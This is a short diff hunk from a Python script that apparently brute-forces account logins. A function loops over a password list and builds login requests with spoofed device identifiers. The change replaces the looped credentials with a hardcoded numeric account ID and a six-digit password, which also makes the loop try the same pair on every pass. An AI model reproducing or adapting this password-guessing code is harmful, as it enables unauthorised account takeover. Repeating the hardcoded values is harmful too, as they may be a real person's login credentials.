@@ -1453,8 +1453,8 @@ def p(uid,pwx,tl):
     try:
         for pw in pwx:
             data = {
-            'email': uid,
-            'password': pw,
+            'email': '100078110812030',
+            'password': '767980',
             'adid': str(uuid.uuid4()),
             'device_id': str(uuid.uuid4()),
             'family_device_id': str(uuid.uuid4()),
